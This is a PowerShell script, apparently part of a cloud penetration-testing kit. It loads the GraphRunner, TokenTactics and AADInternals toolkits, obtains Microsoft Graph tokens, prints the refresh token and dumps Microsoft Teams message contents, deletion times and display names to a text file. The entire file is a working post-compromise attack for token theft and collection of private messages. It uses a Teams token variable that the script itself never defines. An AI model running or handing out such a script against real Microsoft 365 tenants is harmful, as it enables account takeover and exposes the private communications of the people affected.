#!/usr/bin/pwsh

# Load necessary modules
Import-Module /opt/pentestcloud/GraphRunner/GraphRunner.ps1
Import-Module /opt/pentestcloud/TokenTacticsV2/TokenTactics.psd1
Import-Module /opt/pentestcloud/AADInternals/AADInternals.psm1

# Retrieve Graph tokens
Get-GraphTokens
$tokens.refresh_token

# Define the output file path
$outputFile = "./15/teams.txt"

# Ensure the directory exists
if (-not (Test-Path -Path (Split-Path -Path $outputFile))) {
    New-Item -Path (Split-Path -Path $outputFile) -ItemType Directory | Out-Null
}

# Save the results to the output file
Get-AADIntTeamsMessages -AccessToken $MSTeamsToken.access_token | Format-List id, content, deletiontime, *type*, DisplayName | Out-File -FilePath $outputFile

# Output the final command for the user to run manually
Write-Host "Results have been saved to $outputFile."
Write-Host "If you need to manually run the command, use:"
Write-Host "`nGet-AADIntTeamsMessages -AccessToken `$MSTeamsToken.access_token | fl id, content, deletiontime, *type*, DisplayName | Out-File -FilePath $outputFile"
